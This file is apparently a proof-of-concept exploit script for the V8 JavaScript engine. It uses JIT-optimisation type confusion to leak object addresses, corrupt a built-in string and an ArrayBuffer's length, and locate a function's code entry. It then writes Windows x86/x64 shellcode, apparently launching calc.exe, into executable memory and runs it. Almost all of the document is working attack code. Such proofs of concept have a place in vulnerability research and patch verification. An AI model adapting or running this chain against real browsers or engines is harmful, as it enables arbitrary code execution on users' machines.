print("x86 or x64?")
var platform = readline(); //x86 or x64

var n, m, l;
var ab = new ArrayBuffer(0x200);
var ab_addr;
var ab_len_addr;

function read_value() {
	var str = new String(null);
	var length, result;

	if(platform == "x86") {
		length = 4;
	}
	else {
		length = 8;
	}
	
	index = length - 1;
	var result = 0;
	while(index >= 0) {
		result = result * 0x100 + str.charCodeAt(index);
		index -= 1;
	}
	return result
}

function get_arraybuffer_length_addr(arraybuffer_addr) {
	if(platform == "x86") {
		return arraybuffer_addr + 0xc 
	}
	else {
		return arraybuffer_addr + 0x18
	}
		
}

function decode_from_float64(num){
    num1 = num/0x100000000;
    num2 = num&0xffffffff;
    d = new Uint32Array(2);
    d[0] = num2;
    d[1] = num1;
    f = new Float64Array(d.buffer);
    return f[0];
}

function encode_to_float64(num){
    f = new Float64Array(1);
    f[0] = num;
    d = new Uint32Array(f.buffer);
    return d[1] * 0x100000000 + d[0];
}

function evil_fun(a, b) {
	return a + b;
}

function Ctor() {
  n = new Set();
  m = new Map();  
  l = new ArrayBuffer();
}

Ctor();
Ctor();
%OptimizeFunctionOnNextCall(Ctor);
Ctor();


// 1. leak arraybuffer and evil_fun address
function Check(obj) {
   n.xyz = 3.4766863919152113e-308; // do not modify string map
   n.xyz1 = 0x0; // do not modify the value
   n.xyz2 = 0x7000; // enlarge length of builtIn string 'null'
   n.xyz3 = obj; // leak the Object 
   
}
Check(String(null));
Check(String(null));
%OptimizeFunctionOnNextCall(Check);
Check(String(null));

Ctor();
Check(ab);
ab_addr = read_value();
print("ArrayBuffer: " + ab_addr.toString(16));

Check(evil_fun);
var evil_fun_addr = read_value();
print("evil_fun: " + evil_fun_addr.toString(16));


// 2. set null string'value to null string address
Check(String(null));
null_string_addr = read_value();
print("null string: " + null_string_addr.toString(16));

// 3. set null string's hashcode to arraybuffer length address
ab_len_addr = decode_from_float64(get_arraybuffer_length_addr(ab_addr));
function Check2(addr){
    m.xyz = 3.4766863919152113e-308;    
    m.xyz1 = 0x0; 
    m.xyz2 = 0x7000; 
    m.xyz3 = addr; 

}
Check2(ab_len_addr);
Check2(ab_len_addr);
%OptimizeFunctionOnNextCall(Check2);
Check2(ab_len_addr);

Ctor();
Check2(ab_len_addr);
Math.atan(1);



//4. leak code entry
function get_codeEntry() {
	if(platform == "x86") {
		f64 = new Uint32Array(ab);
		return decode_from_float64(f64[7]);
	}
	else {
		f64 = new Float64Array(ab);
		return f64[7];
	}
	
}

var temp = decode_from_float64(evil_fun_addr - 1);
function Check3(addr){
    l.xyz = 3.4766863919152113e-308;  
    l.xyz1 = addr;             
}

Check3(temp);
Check3(temp);
%OptimizeFunctionOnNextCall(Check3);
Check3(temp);

Ctor();
Check3(temp);
var shellcode_entry = get_codeEntry();


// 5. write shellcode

Check3(shellcode_entry);
Math.atan(1);
var shellcode_dict = {
"x86":"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
+"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
+"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
+"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
+"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
+"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
+"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
+"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
+"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
+"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"
+"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
+"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
+"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00", 
"x64": "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
+"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
+"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
+"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
+"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
+"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
+"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
+"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
+"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
+"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
+"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
+"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
+"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
+"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
+"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
+"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
+"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
+"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
+"\x63\x2e\x65\x78\x65\x00"};

var shellcode_str = shellcode_dict[platform];

var shellcode = new Uint8Array(ab);
for (var i=0, strLen=shellcode_str.length; i<strLen; i++) {
	shellcode[i] = shellcode_str.charCodeAt(i);
}

//Math.atan(1);

print(evil_fun(1,2));
//load("C:\\Users\\admin\\Desktop\\test.js")
